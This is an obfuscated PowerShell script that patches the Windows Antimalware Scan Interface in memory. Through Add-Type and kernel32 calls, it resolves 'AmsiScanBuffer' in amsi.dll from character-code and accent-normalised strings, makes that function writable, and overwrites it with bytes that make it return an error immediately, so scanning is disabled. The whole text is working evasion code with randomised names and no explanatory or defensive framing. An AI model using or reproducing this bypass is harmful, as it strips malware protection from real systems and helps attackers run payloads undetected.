$cjxTvttu = @"
using System;
using System.Runtime.InteropServices;
public class cjxTvttu {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr nsO2rlpqOhoIJdNSd, string p_rBXoBU0Cm);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr fmZiHvLNz9, UIntPtr NAVX6ObGtxZYl8I7, uint QfP0N2UOIFeBYW, out uint mN0K_ZZgg0V);
}
"@

Add-Type $cjxTvttu

$bNG8b8J3N871oJ = [cjxTvttu]::LoadLibrary("$([CHar]([byte]0x61)+[CHar](109+51-51)+[ChAr](115*101/101)+[chaR]([BYTe]0x69)+[cHar](46*11/11)+[cHar](100*84/84)+[chaR]([BYTe]0x6c)+[CHAr](17+91))")
$w4Ke_HkXvHObFb = [cjxTvttu]::GetProcAddress($bNG8b8J3N871oJ, "$(('ÀmsíScánB'+'ùffér').NoRmALizE([CHAr]([BYTE]0x46)+[CHar](111+9-9)+[Char]([BYte]0x72)+[CHar](98+11)+[cHaR]([ByTE]0x44)) -replace [chAR](92+55-55)+[ChAR]([bYte]0x70)+[cHAR](123*47/47)+[chAR]([bYte]0x4d)+[char](110)+[CHAr]([byTe]0x7d))")
$p = 0
[cjxTvttu]::VirtualProtect($w4Ke_HkXvHObFb, [uint32]5, 0x40, [ref]$p)
$qCoDm1oAjzXdFp7dm = "0xB8"
$oQ7qllKwNU1TKZ0 = "0x57"
$cgfM6IRkiCju0SC = "0x00"
$FEgV03qf0GwF9a = "0x07"
$HeT = "0x80"
$WpkoXkE5ZhfXLq = "0xC3"
$QbcqYWpU = [Byte[]] ($qCoDm1oAjzXdFp7dm,$oQ7qllKwNU1TKZ0,$cgfM6IRkiCju0SC,$FEgV03qf0GwF9a,+$HeT,+$WpkoXkE5ZhfXLq)
[System.Runtime.InteropServices.Marshal]::Copy($QbcqYWpU, 0, $w4Ke_HkXvHObFb, 6)